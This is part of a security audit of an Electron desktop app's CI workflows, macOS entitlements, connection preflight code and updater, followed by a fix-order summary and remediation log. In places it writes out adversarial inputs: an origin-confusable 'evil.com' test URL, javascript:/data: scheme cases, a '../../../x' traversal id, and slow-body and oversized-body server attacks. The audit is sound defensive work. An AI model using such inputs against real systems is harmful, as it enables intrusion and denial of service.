- **How I found this:** Listed every `uses:` across active and disabled workflows; none SHA-pinned; prioritized the non-`actions/` org one.

#### PD-032 — Entitlements broader than necessary (`allow-unsigned-executable-memory`; possibly `disable-library-validation`)
- **Severity:** Medium (hardening) · **Confidence:** medium
- **Where:** `build/entitlements.mac.plist:6-12`; `build/entitlements.mac.inherit.plist:5-10`
- **Problem:** `allow-jit` is needed (V8/Node under hardened runtime). `allow-unsigned-executable-memory` is a pre-Electron-12 relic on Electron ^41 — it permits RWX shellcode-style memory process-wide. `disable-library-validation` lets the app load *any* unsigned dylib; since `after-pack.mjs` signs every Mach-O under `app-server` with your team identity, library validation (which allows same-team dylibs) may suffice. Positive: the inherit plist omits `allow-dyld-environment-variables`, tighter than electron-builder's default.
- **Fix:** Remove `allow-unsigned-executable-memory` from both plists, run `smoke:mac:packaged`, notarize a test build; then trial-remove `disable-library-validation` (keep only if a bundled native module is ad-hoc/third-party-signed).
- **How I found this:** Read both plists, then read after-pack.mjs end-to-end to confirm all nested Mach-Os get team-signed — which is what makes `disable-library-validation` plausibly removable.

#### PD-033 — Dormant: `sync-upstream.yml.disabled` is an unattended npm→master→tag→release pipeline
- **Severity:** Medium (dormant — currently disabled) · **Confidence:** high
- **Where:** `.github/workflows.disabled/sync-upstream.yml.disabled` (cron + `contents: write` + `git push origin master --tags`)
- **Problem:** If re-enabled as-is: every 6h it takes whatever `@paperclipai/server` npm reports, runs `pnpm install --no-frozen-lockfile` (new upstream postinstalls execute with a write token), commits to master, tags — designed to trigger the release flow. One malicious npm publish upstream ships to end users with zero human review. Also interpolates the registry-controlled version string into `run:` blocks (same pattern as PD-030).
- **Fix (before re-enabling):** Open a PR instead of pushing to master; require manual tag creation; pass the version via `env:` and validate `^\d+\.\d+\.\d+$`.
- **How I found this:** Full read of the disabled file; the workflows.disabled README confirms intentional parking, so severity reflects dormancy. Also checked the other two disabled workflows: cross-run artifact download via `${{ inputs.build_run_id }}` would be an artifact-poisoning surface if revived; no `pull_request_target` anywhere in the repo.

#### PD-034 — Workflow-level `contents: write` granted to all release.yml jobs
- **Severity:** Low · **Confidence:** high
- **Where:** `.github/workflows/release.yml:21-22`
- **Problem:** The three build jobs run `pnpm install` (arbitrary third-party postinstalls) and electron-builder while holding a token that can push code and create releases; only `publish-release` needs write.
- **Fix:** Workflow-level `contents: read`; job-level `contents: write` on `publish-release` only.
- **How I found this:** Checked which jobs actually consume `GITHUB_TOKEN` — only publish (line 212).

#### PD-035 — P12 certificate password passed as a CLI argument (argv-visible)
- **Severity:** Low · **Confidence:** high
- **Where:** `.github/workflows/release.yml:82` (`security import … -P "$MAC_CERTIFICATE_PASSWORD"`)
- **Problem:** Momentarily visible in `ps` on the runner. Mostly theoretical on ephemeral GitHub-hosted runners — but it's the only place a secret leaves env/file scope. Everything else in that step is genuinely well done (`umask 077`, `::add-mask::`, base64 via Python, `always()` cleanup).
- **Fix:** Accept-and-document, or switch to a SHA-pinned `apple-actions/import-codesign-certs`.
- **How I found this:** Traced every secret in the step from source to sink; this was the single argv exposure. Verified no secret-bearing files land in uploaded artifacts.

#### PD-036 — `publish-release` gating: a `platforms=all` tag run builds everything and silently publishes nothing
- **Severity:** Low (process/correctness) · **Confidence:** high
- **Where:** `.github/workflows/release.yml:193-198` (requires `needs.build-mac.result == 'skipped'`)
- **Problem:** Presumably intentional (mac publishes via the notarize flow), but it's a trap: `platforms=all` on a `v*` ref produces no release and no error. Note: `startsWith(inputs.ref, 'v')` would match a branch `vNext`, but `gh release create --verify-tag` (line 239) backstops that.
- **Fix:** Document in the workflow, or add a loud guard step that fails when mac + tag publish are combined.
- **How I found this:** Walked the `if:` matrix for each `platforms` value against `needs` results. Ruled out cross-run artifact poisoning (download-artifact@v4 is same-run by default).

#### PD-037 — Unguarded `find | head -1` feeds `notarytool submit`
- **Severity:** Low · **Confidence:** high
- **Where:** `.github/workflows/notarize-submit.yml:95-96`
- **Problem:** If the release lacks one arch's zip, `notarytool submit ""` fails late and confusingly; the x64 pattern "first non-arm64 zip" could pick a wrong asset if release shape ever changes.
- **Fix:** Capture to a variable, `[ -n "$zip" ] || { echo "::error::…"; exit 1; }`.
- **How I found this:** Traced empty-input behavior under `set -euo pipefail` through the submit helper.

#### PD-038 — tsconfig strictness gaps
- **Severity:** Low · **Confidence:** high
- **Where:** `tsconfig.json:2-16`
- **Problem:** `strict: true` is set (good) but missing `noUncheckedIndexedAccess` (most valuable for this app's URL/health-payload parsing), `noImplicitOverride`, `noFallthroughCasesInSwitch`; `moduleResolution: "node"` is the legacy resolver.
- **Fix:** Add the three flags and fix fallout.
- **How I found this:** Full read of tsconfig against current strictness best practice.

#### PD-039 — Test-suite gaps on the riskiest modules
- **Severity:** Low · **Confidence:** high
- **Where:** `test/window-policy.test.mjs` (28 lines), after-pack/after-sign (zero tests), `test/connection-preflight.test.mjs` (no 3xx-response case), `test/prepare-macos-release-assets.test.mjs` (no missing-arch case)
- **Problem:** No fake assertions found anywhere (several suites assert negative space too — good). But window-policy — the security-riskiest module — has the thinnest coverage: no `file://`, `javascript:`, `data:`, uppercase-scheme, or origin-confusable (`https://host.example.evil.com`) cases. The release-critical signing hooks have no tests at all.
- **Fix:** Add adversarial URL cases to window-policy tests; add a redirect-response case to preflight; cover the missing-arch path in release-asset tests.
- **How I found this:** Read all 9 test files in full, checking each assertion asserts something real, then mapped coverage against the riskiest source modules.

---

### Batch 2 — Connection handling & updater

#### PD-040 — Preflight timeout covers only response headers; body read can hang forever
- **Severity:** Medium · **Confidence:** high (verified)
- **Where:** `src/connection/preflight.ts:247-261` (`fetchWithTimeout`), `213` and `228` (`response.json()`); same pattern in `src/connection/local-server-health.ts:35` (lower risk — local target)
- **Problem:** `fetchWithTimeout` clears the abort timer in `finally` as soon as `fetch` resolves — i.e. at headers-complete. The body is consumed afterwards by the callers with no timeout and no armed signal. A hostile or broken remote can send headers instantly then trickle the body one byte a minute: preflight never resolves, the launcher's "Opening verified remote…" hangs indefinitely, the socket stays open. The 8s `timeoutMs` is a false total deadline.
- **Fix:** Keep the controller armed until the body is consumed — fold the JSON read into the helper and `clearTimeout` only after `await response.json()` completes (body reads honor the abort signal).
- **How I found this:** Traced the lifetime of the `AbortController` versus the lifetime of the network exchange; `clearTimeout` fires when the fetch promise settles (headers-complete per spec), while `.json()` happens in the callers with the timer dead. Confirmed the production `fetchImpl` is Chromium's `session.fetch` with the same semantics. Ruled out redirect-following (correctly `redirect: "manual"`).

#### PD-041 — No response size cap on preflight JSON: memory exhaustion from a hostile remote
- **Severity:** Medium · **Confidence:** high (mechanism; exploitation requires probing a hostile URL)
- **Where:** `src/connection/preflight.ts:213, 228`; `src/connection/local-server-health.ts:35`
- **Problem:** `response.json()` buffers the entire body in main-process memory. A hostile server answering `/api/health` with `Content-Type: application/json` and a multi-GB body can OOM the Electron main process — this runs before any trust is established.
- **Fix:** Check `Content-Length` and read via the stream with a hard cap (256 KB is generous for health payloads), then `JSON.parse` the bounded text. Combine with the PD-040 fix.
- **How I found this:** While fixing the timeout-scope question, checked what bounds body consumption: none — no length check, no stream cap.

#### PD-042 — Non-atomic profile persistence + swallow-all read fallback can silently wipe all profiles
- **Severity:** Medium (data loss) · **Confidence:** high (verified)
- **Where:** `src/connection/profiles.ts:249-253` (`persist` — in-place `writeFileSync`), `256-263` (`readConnectionsFile` — bare catch-all → defaults)
- **Problem:** Compounding pair: (1) a crash/power loss mid-write leaves a truncated `connections.json`; (2) the reader catches *every* error — not just ENOENT, but EACCES, transient I/O, and parse errors — and returns defaults; the next `persist()` (any mutation) then overwrites the file, permanently destroying all saved remote profiles.
- **Fix:** Atomic write (`writeFileSync(tmp)` + `renameSync`); in the reader, fall back to defaults only on ENOENT/SyntaxError — and on SyntaxError, preserve the unreadable file as `connections.json.bak` before the next overwrite.
- **How I found this:** Examined the full read–sanitize–write cycle under the tampered/corrupt-file threat model; the undiscriminating `catch` plus in-place write is a classic corruption-then-clobber pair.

#### PD-043 — Hostnames starting with "fc"/"fd" misclassified as private IPv6
- **Severity:** Low · **Confidence:** high (verified)
- **Where:** `src/connection/validate.ts:87-90`
- **Problem:** `isPrivateIpv6` does `startsWith("fc")`/`startsWith("fd")` on the raw hostname — `fcbarcelona.com` is "private". Consequence: the *softer* "trusted private network" insecure-HTTP warning is shown for a public internet host, understating risk at exactly the moment the user decides whether to allow plaintext HTTP. (Warning-copy impact only — not an access-control boundary.)
- **Fix:** Require an IPv6 literal first: `if (!lower.includes(":")) return false;` then check `::1`/`fc`/`fd`/`fe80:`.
- **How I found this:** Tested the classifier against adversarial hostnames; the IPv4 path requires a strict dotted-quad regex but the IPv6 path has no literal check at all.

#### PD-044 — Private-range detection gaps: `0.0.0.0`, `fe80::/10`, IPv4-mapped IPv6
- **Severity:** Low · **Confidence:** medium
- **Where:** `src/connection/validate.ts:65-90`
- **Problem:** `0.0.0.0` (routes to loopback on macOS/Linux), link-local `fe80::/10`, and `::ffff:192.168.x.x` mapped forms are not classified private — affects only which warning string the user sees.
- **Fix:** Add `a === 0`, the `fe80:` prefix, and unwrap `::ffff:` before the IPv4 check.
- **How I found this:** Enumerated RFC special-use ranges against the conditionals. Confirmed WHATWG `URL` already normalizes decimal/octal/hex IPv4 tricks before this code runs, so those bypasses are not live.

#### PD-045 — `ConnectionStore` doesn't enforce its own insecure-HTTP consent invariant on health/result updates
- **Severity:** Low · **Confidence:** possible (currently mitigated by callers)
- **Where:** `src/connection/profiles.ts:193-199, 204-213, 215-226`
- **Problem:** `saveRemoteProfile` refuses `http://` without `allowInsecureHttp: true`, but `recordConnectionResult`/`recordRemoteHealth`/`syncRemoteProfileUrl` overwrite `remoteUrl` and auto-set `allowInsecureHttp` from the result — the store grants consent to itself — and trust `result.normalizedUrl` blindly (a `buildFailure` result carries the raw trimmed input as `normalizedUrl`, preflight.ts:337). Current main.ts callers re-validate consent first, so this is defense-in-depth today; any future caller bypasses the gate.
- **Fix:** Only update `remoteUrl` when `result.ok === true`; throw (like `saveRemoteProfile`) instead of auto-setting the consent flag.
- **How I found this:** Compared the invariant enforced in `saveRemoteProfile` against every other mutation path; traced `normalizedUrl` provenance through `buildFailure`; confirmed caller mitigation in main.ts (hence "possible").

#### PD-046 — Tampered profile `id` flows unsanitized into the Electron session partition name
- **Severity:** Low · **Confidence:** possible
- **Where:** `src/connection/profiles.ts:304-317` (accepts any string id); `src/connection/window-policy.ts:33-35` (`remotePartitionForProfile`)
- **Problem:** A tampered `connections.json` id like `"../../../x"` reaches `session.fromPartition("persist:paperclip-remote-…")`, from which Chromium derives an on-disk directory; Electron's sanitization of hostile partition names is version-dependent. Duplicate ids would also alias two profiles onto one cookie jar (concrete regardless).
- **Fix:** Validate `raw.id` against `/^[0-9a-f-]{36}$/i` in `sanitizeRemoteProfile`, regenerate on mismatch, de-duplicate. (Same root cause as PD-011 — one fix covers both.)
- **How I found this:** Diffed what `sanitizeRemoteProfile` validates against what it passes through verbatim — only `id` and `name`, and `id` escapes into a filesystem-adjacent namespace. Confirming exploitability needs a partition-name escaping test on Electron 41.

#### PD-047 — Updates downloaded without consent and installed on quit even after "Later"
- **Severity:** Low (consent/UX integrity, not code execution) · **Confidence:** high
- **Where:** `src/updater.ts:32-33, 71-77, 285-327`
- **Problem:** `autoDownload = false` signals a consent-based design, but the silent scheduler passes `downloadIfAvailable: true` (downloads without asking), and `autoInstallOnAppQuit = true` means a downloaded update installs at next quit even when the user answered "Later" — which reads as "don't update yet" but means "update when I quit". No downgrade risk (`allowDowngrade` defaults false); feed is GitHub Releases over HTTPS.
- **Fix:** Pick one consent model and align all three flags: either don't auto-download until the user accepts, or set `autoInstallOnAppQuit = false` and install only on explicit "Restart".
- **How I found this:** Cross-checked the three consent surfaces (autoDownload flag, silent-check options, dialog semantics) for consistency; they disagree.

#### PD-048 — Restart-prompt race: menu check silently no-ops; staged-update record cleared before quit succeeds
- **Severity:** Low · **Confidence:** medium
- **Where:** `src/updater.ts:104-107, 302-307, 321`
- **Problem:** If the auto restart prompt is on screen, "Check for Updates" from the menu returns silently (`restartPromptVisible` guard) with zero feedback. And `downloadedVersion = null` is set *before* `quitAndInstall()` — if quit is vetoed, the in-memory record of the staged update is gone and the next check offers to re-download it.
- **Fix:** Focus the existing dialog's window from the menu path; clear `downloadedVersion` only after quit is actually under way.
- **How I found this:** Walked the state machine of the four module-level flags across both entry points; the check/download promise-sharing is done correctly — these were the two inconsistent transitions.

#### PD-049 — Malformed JSON from a reachable server misclassified as "unreachable"
- **Severity:** Low · **Confidence:** high
- **Where:** `src/connection/preflight.ts:186-196, 213, 228, 354-372`
- **Problem:** `Content-Type: application/json` + malformed body → `response.json()` throws → the outer catch classifies it `unreachable, paperclipDetected: false`, sending users down the wrong troubleshooting path (the non-JSON content-type case *is* handled gracefully). Side note: those non-JSON paths never `response.body?.cancel()` — harmless at this frequency.
- **Fix:** Wrap each `.json()` in its own try/catch → `reason: "not_paperclip"` with an "invalid JSON" detail; preserve `paperclipDetected: true` after a successful health probe.
- **How I found this:** Enumerated every throw site inside the big try block and checked which `reason` each lands on.

#### PD-050 — `connections.json` written world-readable
- **Severity:** Low · **Confidence:** high (verified)
- **Where:** `src/connection/profiles.ts:252`
- **Problem:** Default mode 0644. The file carries no credentials (userinfo rejected at validation; auth lives in Electron partitions) — hygiene only: server URLs + timestamps are mildly sensitive infrastructure metadata on shared machines.
- **Fix:** `{ encoding: "utf8", mode: 0o600 }` (apply to the atomic-write temp file from PD-042 too).
- **How I found this:** Chased the "plaintext tokens on disk" checklist item: confirmed the profile schema is URL+metadata only, then checked the write mode.

#### PD-051 — On-disk `version` field written but never read: forward-compat downgrade hazard
- **Severity:** Low · **Confidence:** high
- **Where:** `src/connection/profiles.ts:265-282`; `CONNECTIONS_FILE_VERSION` in types.ts:3
- **Problem:** A future v2 schema read by v1 code gets partially parsed through v1 rules, unknown data dropped, and the file overwritten as v1 — irreversible on downgrade.
- **Fix:** Compare versions on load; back up the file before migrating/clobbering a newer version.
- **How I found this:** Grepped the constant — only ever written, never compared.

---

## Ruled out (checked, no finding)

- **lodash override `4.18.1` (package.json:52):** verified legitimate — pnpm-lock resolves `lodash@4.18.1` with a real integrity hash, and the npm registry confirms 4.18.1 exists/is current. Not a typo. Remaining overrides are known-CVE patch pins (good hygiene). Maintenance note: exact overrides silently cap future transitive upgrades; revisit periodically.
- **Electron window hardening (main.ts):** `nodeIntegration: false` + `contextIsolation: true` on all windows; remote windows sandboxed; `setWindowOpenHandler` denies all and routes externals through `shouldOpenExternally` (http/https + foreign-origin check); `will-navigate`/`will-redirect` both enforced; permission requests denied; webviews blocked.
- **Launcher XSS via profile name/URL/server strings:** every such value reaches the DOM through `escapeHtml` in text position or `textContent`; `getLauncherHtml()` is a single template literal with zero `${}` interpolations (no build-time injection). Credentialed URLs rejected by `validate.ts` before display. (`escapeAttr` at launcher-html.ts:1959 is dead code — never called; delete for clarity.)
- **Command injection via release-critical variables:** every codesign/notarytool/gh/ditto/electron-builder call uses argv arrays; signing identities never touch a shell string. Only the PD-023 sites interpolate, all constant/repo-rooted today.
- **Zip-slip in verification/notarization:** `ditto -x -k` into fresh `mkdtemp` dirs; Node tarball extraction names the exact member.
- **Secrets in process lists/logs (scripts):** notarytool gets a key-file *path*; gh uses its own credential store; logged JSON contains submission IDs/status only. (CI exception: PD-035.)
- **Cross-run artifact poisoning in release.yml:** `download-artifact@v4` pulls same-run artifacts only.
- **electron-builder `files` glob:** tight (`dist/**/*` + package.json) — no secret-bundling risk; publish correctly scoped to own repo, `releaseType: release`.
- **`runtime-safety.ts` / smoke test:** genuinely good defensive code — refuses production data paths under isolation, validates absolute paths; smoke test asserts no production-path touches.
- **Prototype pollution via profile JSON:** `sanitizeConnectionsFile`/`sanitizeRemoteProfile` rebuild objects field-by-field with type guards; parsed `__proto__` never escapes into spreads of trusted objects.
- **Redirect-following SSRF / credential leak in preflight:** `redirect: "manual"` on every fetch; probe URLs built from the validated origin only; userinfo/IDN tricks rejected/normalized at validation.
- **window-policy origin checks:** exact `parsed.origin === allowedOrigin` equality (not substring); opaque origins (`file:`, `data:`, `about:blank`) serialize to `"null"` and fail closed; `allowedOrigin` always derives from an http(s) URL's `.origin` so the `"null"==="null"` self-match is unreachable.
- **Updater downgrade/channel confusion:** `allowDowngrade` and channel overrides unset; electron-updater defaults safe; feed is own-repo GitHub Releases over HTTPS.

---

## Summary

**Coverage: all 46 inventory items are marked done.** Every first-party source file was read
in full; each High finding and each batch's key claims were independently re-verified
against the cited lines before being recorded.

Totals: **0 Critical · 5 High · 15 Medium · 31 Low** (51 findings, PD-001…PD-051).

### High
| ID | Title | File |
|----|-------|------|
| PD-001 | No single-instance lock — 2nd instance kills 1st instance's live server | src/main.ts |
| PD-015 | Bundled Node binary downloaded with no checksum verification | scripts/prepare-server.mjs |
| PD-016 | Node cache key omits version — bumps silently ship old Node | scripts/prepare-server.mjs |
| PD-017 | Shipped server bundle: no lockfile, lifecycle scripts enabled | scripts/prepare-server.mjs |
| PD-018 | Shipped UI built from mutable upstream git tag, no commit pin | scripts/build-ui.mjs |

### Medium
| ID | Title | File |
|----|-------|------|
| PD-002 | Stale-PID kill can SIGTERM an unrelated process tree | src/main.ts |
| PD-003 | Port TOCTOU + unauthenticated localhost trust | src/main.ts |
| PD-004 | Login-shell PATH probe executes rc files, trusts result | src/main.ts |
| PD-010 | Stale verification applied to a different URL (verify bypass) | src/launcher-html.ts |
| PD-019 | Future npm UI publication silently switches shipped-UI source | scripts/build-ui.mjs |
| PD-020 | Stage install: transitives unpinned; resolved lockfile deleted | scripts/release-macos-local.mjs |
| PD-021 | Missing app-server bundle tolerated — gutted app passes verify | after-pack / stage-after-pack / verify scripts |
| PD-022 | Notarization gate fail-open (signing gate is fail-closed) | scripts/after-sign.mjs |
| PD-030 | workflow_dispatch inputs interpolated into run: blocks | all 3 active workflows |
| PD-031 | Actions tag-pinned, not SHA-pinned (incl. third-party) | all workflows |
| PD-032 | Entitlements broader than needed (unsigned-exec-memory, lib validation) | build/*.plist |
| PD-033 | (dormant) sync-upstream = unattended npm→release pipeline | workflows.disabled |
| PD-040 | Preflight timeout covers headers only — body can hang forever | src/connection/preflight.ts |
| PD-041 | No size cap on preflight JSON — OOM from hostile remote | src/connection/preflight.ts |
| PD-042 | Non-atomic persist + swallow-all read can wipe all profiles | src/connection/profiles.ts |

### Low
PD-005…PD-009 (shutdown robustness, port-probe timeout, preload listeners) ·
PD-011…PD-014 (launcher id-attribute escaping, latent class injection, null guards, double-submit) ·
PD-023…PD-029 (script shell-interpolation shape, weak-verify default, electronVersion drift, rm containment, Finder-duplicate heuristic, hand-rolled YAML for update manifests, gh error conflation) ·
PD-034…PD-039 (CI token scope, argv password, publish gating trap, find|head guard, tsconfig, test gaps) ·
PD-043…PD-051 (private-host classifier gaps, store consent invariant, partition id, updater consent model & races, JSON misclassification, file mode, schema version).

### Recommended fix order
1. **Supply chain (PD-015+PD-016 one patch, PD-017, PD-018):** checksum + version the bundled Node; lockfile + `--ignore-scripts` for the shipped bundle; pin the upstream commit SHA. These protect every artifact you ship.
2. **PD-001** single-instance lock (one-line guard, prevents real-world data-dir fights).
3. **Fail-closed release gates (PD-021, PD-022)** so a partial/un-notarized artifact can't pass green.
4. **CI hardening (PD-030, PD-031):** inputs via `env:`, SHA-pin actions — small diffs, big blast-radius reduction.
5. **PD-040–PD-042** (preflight body timeout/cap, atomic profile persistence) and **PD-010** (verify-token guard).
6. Lows opportunistically; PD-011+PD-046 share one fix (UUID-validate profile ids; drop inline onclick handlers).

---

## Remediation log

### 2026-06-11 — branch `audit-fixes-2026-06`

Fixed in this pass (build + 52 unit tests green; new tests added for the security-relevant changes):

- **Supply chain:** PD-015 (verify bundled Node against nodejs.org `SHASUMS256.txt` before extraction), PD-016 (version-keyed Node cache marker; stale cache rebuilt on `NODE_VERSION` bump).
- **Electron main:** PD-001 (single-instance lock + `second-instance` focus), PD-002 (strict `/^\d+$/` PID validation), PD-005/PD-006 (idempotent `killServer` with shared promise + SIGKILL escalation after 5s), PD-008 (port-probe connect timeout).
- **Connection layer:** PD-040 (abort timer stays armed through body read), PD-041 (256 KB preflight body cap), PD-049 (malformed JSON no longer misclassified as "unreachable"), PD-042 (atomic profile write + discriminating reader that backs up corrupt files and no longer clobbers on EACCES), PD-050 (mode 0600), PD-043/PD-044 (private-host classifier: IPv6-literal guard, `0.0.0.0`, `fe80::/10`, IPv4-mapped IPv6).
- **Launcher UI:** PD-010 (verify-token staleness guard + verified-URL match before connect), PD-011/PD-046 (UUID-validate/regenerate profile ids + de-dup on load), PD-013 (null `snapshot` guards), PD-014 (re-entry/double-submit guard on connect paths), PD-009 (preload `onStatus` returns an unsubscribe).
- **Release gates / CI:** PD-021 (missing embedded server bundle now fails verification), PD-022 (notarization fails closed unless `ALLOW_UNNOTARIZED_MACOS_BUILD=true`), PD-030 (workflow_dispatch inputs routed through step `env:` + tag validation in all three workflows), plus a new `ci.yml` (build + unit tests on PR/push).
- **Strictness:** PD-038 (added `noImplicitOverride`, `noFallthroughCasesInSwitch`).

### 2026-06-11 — follow-up branch scan

Fixed in this pass (`pnpm audit --audit-level moderate`, build, 54 unit tests, script syntax checks, and diff whitespace checks green):

- **Dependency audit:** added patched transitive overrides for current `pnpm audit` findings (`tar`, `undici`, `fast-uri`, `better-auth`, `ws`, `@anthropic-ai/sdk`, `@tootallnate/once`, `qs`, `tmp`, `hono`, `kysely`, `brace-expansion` 5.x).
- **Electron/main runtime:** PD-004 (removed login-shell PATH probing), PD-007 (reuses the current local server/window instead of double-spawning), and partially mitigated PD-003 by requiring local `/api/health` to pass before loading the embedded server origin.
- **Connection store:** PD-045 (remote health/result updates can no longer grant insecure-HTTP consent to themselves) and PD-051 (newer `connections.json` versions are backed up instead of downgraded in place).
- **Updater consent:** PD-047/PD-048 (scheduled checks no longer auto-download, updates no longer auto-install on app quit after "Later", and staged update state is not cleared before `quitAndInstall()`).
- **Build/release scripts:** PD-023 (removed shell-string cleanup/download/extract/clone/build commands from the edited release paths), PD-024 (verifier now requires expected identity/team or stapling), PD-025 (packaging uses installed Electron version), PD-026 (repo-contained output roots unless `--allow-external-output` is explicit), PD-027 (Finder duplicate removal now requires an original sibling), PD-029 (GitHub release lookup only treats actual not-found as missing).
- **CI/release workflows:** PD-031 (active actions pinned to commit SHAs plus Dependabot actions updates), PD-034 (default release workflow token is read-only; publish job alone gets `contents: write`), PD-037 (notarization submit requires exactly one x64 and one arm64 ZIP).

Deferred (noted, not in this PR):

- PD-017/PD-018/PD-019/PD-020 — require a committed staging lockfile / pinned upstream commit SHA (needs a reviewed manifest, out of scope for a code-only patch).
- PD-032 — entitlement tightening needs a notarized test build to validate.
- PD-038 `noUncheckedIndexedAccess` — broad fallout into unrelated window-sizing code; deferred to keep this diff focused.
- PD-003 full child identity — needs a server-supported startup token/handshake; this pass verifies health before load but cannot prove process identity alone.
- PD-028 — replacing the hand-rolled YAML parser and recomputing release manifest sha512s needs a focused release-manifest parser change.
- PD-033 — dormant disabled workflow remains documented but is not executable.
- PD-035/PD-036 — remaining release-policy workflow hardening; tracked for a follow-up pass.
- PD-039 (remaining) — broader release-script test coverage gaps.
